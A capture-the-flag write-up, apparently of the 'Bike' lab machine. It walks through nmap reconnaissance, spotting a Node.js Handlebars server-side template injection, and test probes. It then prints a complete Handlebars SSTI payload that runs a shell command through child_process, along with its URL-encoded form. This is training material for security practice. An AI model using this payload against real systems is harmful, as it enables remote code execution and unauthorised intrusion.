# Bike

![Bike](Challenges/Images/Bike/Screenshot_2026-06-03_01-40-48.png)

Started up the machine and I was provided with an IP address

I performed an nmap scan on the provided Ip address and got two open ports, an ssh/22 and an http/80

With more details on the nmap scan, it was obvious that the system is running Node.js (Express Middlware) with a http-title called Bike.


![Webpage](Challenges/Images/Bike/Screenshot_2026-06-03_01-41-26.png)

upon pasting the IP address into the web browser, the page boots up with the title Bike.

![Webpage](Challenges/Images/Bike/Screenshot_2026-06-03_01-41-43.png)

There is only one input field which reflects your input when submitted and an information that the website is under construction. Well, this is good because with all the collected information, the vulnerability should be known already.

Key info:
- Port 22 and 80
- Node.js (Express Middleware) running on the website
- An input field that reflects what was inputted back on the screen.


With the above information, the vulnerability we are working with is a Server Side Template Injection of Node.js Express Middleware.

Identifying the vulnerability is the easy part, now comes the hard part which is researching about the vulnerability. It's not every vulnerability that is known as a security researcher, so over time, we would have to be researching proof of concepts on several vulnerabilities.

![](Challenges/Images/Bike/Screenshot_2026-06-03_01-42-22.png)

I tried a couple of payloads to test the input field to know if it was indeed vulnerable.

```
{{7*7}} 
Welcome, {{:given_name}}
${7*7}

```


I got an parse error which gave me the needed information to better understand how the website works. Notice that the website utilizes handlebars environment. This alone helps streamline the exploit to be used. 


Now, I spent more than half a day researching this until I came across a website, [HackTrick](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejsl) which provided the needed payload which I didn't expect to be that long.

![](Challenges/Images/Bike/Screenshot_2026-06-03_01-43-21.png)

The payload utilized in this box was

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D

```

![](Challenges/Images/Bike/Screenshot_2026-06-03_01-43-21.png)

So, the URL encoding of the payload was what was used as seen in the images. Once you have tweaked the payload to your desired way, you can then encode it in burp suite or any encoder you prefer.


![](Challenges/Images/Bike/Screenshot_2026-06-03_01-44-07.png)

